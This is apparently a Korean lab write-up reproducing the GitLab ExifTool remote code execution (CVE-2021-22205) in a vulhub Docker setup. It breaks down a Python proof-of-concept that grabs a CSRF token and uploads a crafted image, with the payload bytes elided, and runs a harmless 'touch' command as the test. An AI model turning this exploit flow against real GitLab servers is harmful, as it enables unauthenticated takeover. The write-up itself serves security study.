## 1.  취약점 요약

**취약점 종류**: 인증되지 않은 이미지 업로드 기능을 통한 원격 코드 실행 (Unauthenticated RCE)

**대상**: GitLab CE/EE 11.9 이상 ~ 13.10.3 이하 버전

**원인**: GitLab이 이미지 파일 업로드 시 내부적으로 사용하는 `ExifTool`의 취약점을 적절히 검증하지 않고 호출하여, 악의적으로 조작된 이미지 파일을 통해 서버 측에서 임의 명령어가 실행되는 문제.

## 2. 환경 구성 및 실행

### 2.1 Docker 환경 준비

```
git clone https://github.com/vulhub/vulhub.git
cd vulhub/gitlab/cve-2021-22205
docker compose up -d
```

- **GitLab 접속 URL**: `http://localhost:8888`
- **초기 설정**: 회원가입은 필요 없음 (Unauthenticated 공격)

### 2.2 docker-compose.yml 요약

```
version: '3'
services:
  gitlab:
    image: gitlab/gitlab-ce:13.10.3-ce.0
    ports:
      - "8888:80"
    depends_on:
      - redis
      - postgresql
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://localhost:8888'
  redis:
    image: redis:latest
  postgresql:
    image: postgres:latest
    environment:
      POSTGRES_PASSWORD: password
```

- GitLab 13.10.3 버전 사용.
- Redis와 PostgreSQL 의존성 컨테이너 포함.

![Image](https://github.com/user-attachments/assets/abc2c8cd-0f54-4ab7-b95e-84809b321399)
![Image](https://github.com/user-attachments/assets/54169746-44c2-4d18-922a-b09b3c58c914)

### 2.3 poc.py 코드 분석

### (1) 기본 설정

```
import sys
import re
import requests

# 명령줄 인자 입력 받음
target = sys.argv[1]   # 대상 GitLab URL
command = sys.argv[2]  # 서버에서 실행할 명령어

session = requests.session()
CSRF_PATTERN = re.compile(rb'csrf-token" content="(.*?)" />')
```

- `target`: 공격 대상 GitLab 서버 URL
- `command`: 서버에서 실행하고 싶은 명령어 (예: `touch /tmp/success`)

### (2) 악성 페이로드 생성

```
def get_payload(command):
    rce_payload = b'...'  # 바이너리 조작
    rce_payload += command.encode()
    rce_payload += b'...'
    return rce_payload
```

- 내부에 명령어를 포함한 악성 데이터 생성.
- ExifTool 파싱 중 명령어가 실행되도록 설계.

### (3) CSRF 토큰 획득

```
def csrf_token():
    response = session.get(f'{target}/users/sign_in', headers={'Origin': target})
    g = CSRF_PATTERN.search(response.content)
    assert g, 'No CSRF Token found'
    return g.group(1).decode()
```

- GitLab은 파일 업로드 시 CSRF 토큰을 요구.
- 로그인은 필요 없지만, 토큰은 반드시 포함해야 정상 업로드 가능.

### (4) 익스플로잇 수행

```
def exploit():
    files = [('file', ('test.jpg', get_payload(command), 'image/jpeg'))]
    session.post(f'{target}/uploads/user', files=files, headers={'X-CSRF-Token': csrf_token()})
```

- 조작된 이미지 파일을 `/uploads/user` 엔드포인트로 업로드하여 서버 측 코드 실행 유도.

### 2.4 PoC 실행

1. 공격용 명령어를 설정하여 실행:

```
python poc.py http://localhost:8080 "touch /tmp/success"
```

1. GitLab 서버 컨테이너 안으로 진입:

```
docker ps
docker exec -it <gitlab-container-id> bash
```

1. `/tmp` 디렉토리 안을 확인하여 성공 여부 검증:

```
ls /tmp
```

> success 파일이 존재하면, 명령어 실행(RCE)이 성공한 것.
> 

![Image](https://github.com/user-attachments/assets/7c3ad6ca-6b61-446b-a77f-e71d9f039353)

### 정리

- 단순한 이미지 업로드 기능이라도, **파일의 내용을 어떻게 처리하는지에 따라 심각한 보안 위협**이 발생할 수 있다.
- 인증 없이 파일 업로드만으로 공격이 가능하다는 점에서, **외부 입력에 대한 검증 부족의 위험성**을 실감할 수 있었다.